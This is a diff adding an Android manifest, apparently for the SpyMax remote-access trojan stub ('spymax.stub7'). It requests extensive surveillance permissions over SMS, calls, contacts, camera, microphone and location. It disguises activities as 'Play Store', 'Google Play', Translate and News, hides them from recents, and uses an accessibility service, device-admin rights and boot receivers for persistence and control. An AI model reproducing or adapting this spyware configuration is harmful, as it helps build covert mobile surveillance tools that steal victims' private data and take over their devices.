@@ -1,0 +1,294 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="spymax.stub7">
+
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <queries>
+        <package android:name="trg.trgtapp.trg" />
+    </queries>
+
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/d1d2d3d4d5d6"
+        android:label="@string/f1f2f3f4f5f6"
+        android:largeHeap="true"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:usesCleartextTraffic="true">
+        <activity android:name="._access_ask_"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            ></activity>
+
+        <activity
+            android:name=".CamActivity"
+            android:excludeFromRecents="true"
+            android:label="Play Store"
+            android:noHistory="true">
+            <intent-filter>
+                <action android:name="xyz" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name=".SCRActivity"
+            android:excludeFromRecents="true"
+            android:label="Google Play" />
+
+        <provider
+            android:name="android.support.v4.content.FileProvider"
+            android:authorities="spymax.stub7.suffix.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/provider_paths" />
+        </provider>
+
+
+        <activity
+            android:name=".ClassGen9"
+            android:icon="@drawable/d1d2d3d4d5d6"
+            android:label="@string/f1f2f3f4f5f6" />
+
+        <activity-alias
+            android:name=".MainActive"
+            android:enabled="true"
+            android:launchMode="singleTask"
+            android:icon="@drawable/d1d2d3d4d5d6"
+            android:label="@string/f1f2f3f4f5f6"
+            android:targetActivity=".ClassGen9">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <action android:name="com.App.Reborn" />
+<!--                <category android:name="android.intent.category.DEFAULT" />-->
+<!--                <category android:name="android.intent.category.HOME" />-->
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+
+
+        </activity-alias>
+
+        <activity
+            android:name="._trns_g_"
+            android:label="@string/trans" />
+
+        <activity-alias
+            android:name=".GoogleTranslate"
+            android:enabled="false"
+            android:icon="@drawable/tranclat"
+            android:label="Translate"
+            android:targetActivity="._trns_g_"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+
+        </activity-alias>
+
+        <activity
+            android:name="._news_g_"
+            android:label="@string/newss" />
+
+        <activity-alias
+            android:name=".googlenews"
+            android:enabled="false"
+            android:icon="@drawable/nws"
+            android:label="News"
+            android:targetActivity="._news_g_">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+
+        </activity-alias>
+
+        <activity
+            android:name="._skin_cls_"
+            android:configChanges="orientation|screenSize"
+            android:label="skin.name" />
+
+        <activity-alias
+            android:name=".costm"
+            android:configChanges="orientation|screenSize"
+            android:enabled="false"
+            android:icon="@drawable/skinicon"
+            android:label="skin.name"
+            android:targetActivity="._skin_cls_">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+
+        </activity-alias>
+
+        <service
+            android:name=".WackMeUpJob"
+            android:enabled="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <receiver android:name=".SensorRestarterBroadcastReceiver">
+            <intent-filter>
+                <action android:name="RestartSensor" />
+            </intent-filter>
+        </receiver>
+
+
+
+        <service
+            android:name=".ClassGen11"
+            android:enabled="true"
+            android:label="@string/f1f2f3f4f5f6" />
+        <service
+            android:name=".ClassGen6"
+            android:enabled="true"
+            android:label="@string/f1f2f3f4f5f6" />
+        <service
+            android:name=".myworker"
+            android:enabled="true"
+            android:label="@string/f1f2f3f4f5f6" />
+
+
+
+
+        <service
+            android:name=".ClassGen5"
+            android:enabled="true"
+            android:label="@string/f1f2f3f4f5f6" />
+
+
+        <service
+            android:name=".ClassGen12"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:persistent="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility" />
+
+        </service>
+
+
+        <service
+            android:name="._srv_worker_"
+            android:enabled="true"
+            android:persistent="true" />
+
+        <receiver
+            android:name=".ClassGen1"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+
+
+        </receiver>
+        <receiver
+            android:name=".RC"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_INSTALL" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_CHANGED" />
+
+                <data android:scheme="package" />
+            </intent-filter>
+
+
+        </receiver>
+        <receiver android:name=".ClassGen14">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.Intent.ACTION_USER_PRESENT" />
+            </intent-filter>
+
+        </receiver>
+
+        <service android:name="._cap_sc_" />
+
+        <activity
+            android:name="._sc_fb_"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name="._ask_draw_"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="._ask_prim_"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="._ask_battary_"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name=".activityadm"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <receiver
+            android:name=".AdminReciver"
+            android:description="@string/device_description"
+            android:label="@string/device_admin_label"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/adminrights" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
